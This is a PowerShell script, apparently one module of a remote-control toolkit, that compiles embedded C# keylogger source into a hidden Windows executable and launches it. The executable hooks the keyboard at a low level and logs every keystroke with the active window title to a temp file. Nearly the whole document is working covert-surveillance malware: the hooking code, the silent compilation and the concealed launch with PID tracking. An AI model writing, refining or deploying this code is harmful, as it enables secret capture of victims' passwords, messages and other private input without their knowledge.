# keylog start – fixed version (STA, error handling, standalone EXE)

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'  # We want errors to be caught, not silenced
$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$errorLog = "$env:TEMP\keylog_error_$channelID.txt"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
$exePath = "$env:TEMP\keylog_$channelID.exe"
$csharpFile = "$env:TEMP\keylog_csharp_$channelID.cs"

# Clean up previous runs
Remove-Item $pidFile, $errorLog, $exePath, $csharpFile -Force -ErrorAction SilentlyContinue

# Kill any old process for this channel
if (Test-Path $pidFile) {
    $oldPid = Get-Content $pidFile
    Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
    Remove-Item $pidFile -Force
}

# C# code with STAThread and error handling
$cSharpCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class Keylogger
{
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logFile;
    private static StreamWriter _writer;
    private static string _errorLog;

    [STAThread]
    static void Main(string[] args)
    {
        // Get log file path from environment variable (set by PowerShell)
        _logFile = Environment.GetEnvironmentVariable("KEYLOG_FILE");
        _errorLog = Environment.GetEnvironmentVariable("KEYLOG_ERROR");
        if (string.IsNullOrEmpty(_logFile))
        {
            _logFile = Path.Combine(Path.GetTempPath(), "keylog_default.txt");
        }
        if (string.IsNullOrEmpty(_errorLog))
        {
            _errorLog = Path.Combine(Path.GetTempPath(), "keylog_error_default.txt");
        }

        // Open log file
        try
        {
            _writer = new StreamWriter(_logFile, true) { AutoFlush = true };
        }
        catch (Exception ex)
        {
            File.WriteAllText(_errorLog, "Failed to open log file: " + ex.ToString());
            return;
        }

        // Write ready file (optional, for sync)
        string readyFile = Path.Combine(Path.GetTempPath(), "keylog_ready_" + Process.GetCurrentProcess().Id + ".txt");
        File.WriteAllText(readyFile, "ready");

        // Set hook
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }

        if (_hookID == IntPtr.Zero)
        {
            int error = Marshal.GetLastWin32Error();
            File.WriteAllText(_errorLog, "SetWindowsHookEx failed with error: " + error);
            return;
        }

        // Run message pump
        Application.Run();
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string windowTitle = "";
            IntPtr handle = GetForegroundWindow();
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            if (GetWindowText(handle, buff, nChars) > 0)
                windowTitle = buff.ToString();

            string keyName = ((Keys)vkCode).ToString();
            string line = string.Format("[{0:HH:mm:ss}][{1}] {2}", DateTime.Now, windowTitle, keyName);
            _writer.WriteLine(line);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@

# Save C# code to file
$cSharpCode | Out-File -FilePath $csharpFile -Encoding utf8

# Compile to executable (Windows Forms app, no console window)
try {
    Add-Type -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly $exePath -OutputType WindowsApplication -TypeDefinition (Get-Content $csharpFile -Raw) -ErrorAction Stop
} catch {
    $errorMsg = "Compilation failed: $_"
    $errorMsg | Out-File -FilePath $errorLog -Encoding utf8
    Write-Output "Keylogger compilation error. Check $errorLog"
    Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
    exit 1
}

# Set environment variables for the process
$envVars = @{
    "KEYLOG_FILE" = $logFile
    "KEYLOG_ERROR" = $errorLog
    "ChannelID" = $channelID  # pass through for consistency
}

# Start the executable hidden
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $exePath
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false  # required for environment variables
foreach ($key in $envVars.Keys) {
    $psi.EnvironmentVariables[$key] = $envVars[$key]
}

try {
    $p = [System.Diagnostics.Process]::Start($psi)
    if ($p -and !$p.HasExited) {
        $p.Id | Out-File -FilePath $pidFile -Force
        Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"
        # Optionally wait a bit and check error log
        Start-Sleep -Seconds 2
        if (Test-Path $errorLog) {
            $err = Get-Content $errorLog -Raw
            if ($err) {
                Write-Output "Warning: Keylogger reported error: $err"
            }
        }
    } else {
        Write-Output "Keylogger process failed to start or exited immediately."
        if (Test-Path $errorLog) {
            $err = Get-Content $errorLog -Raw
            Write-Output "Error log: $err"
        }
    }
} catch {
    $errorMsg = "Failed to start process: $_"
    $errorMsg | Out-File -FilePath $errorLog -Encoding utf8
    Write-Output "Keylogger start error. Check $errorLog"
} finally {
    Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
}